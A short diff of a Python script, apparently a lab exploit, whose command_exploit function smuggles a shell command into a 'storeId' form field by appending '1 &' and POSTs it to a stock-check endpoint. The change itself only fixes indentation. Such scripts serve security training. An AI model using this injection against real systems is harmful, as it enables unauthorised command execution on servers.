@@ -15,7 +15,7 @@ def command_exploit(url, command):
     command_injection = "1 &" + command
     paramaters = {
         'productId':'1',
-          'storeId': command_injection}
+        'storeId': command_injection}
     response = requests.post(
         url + stock_path,
         data=paramaters,
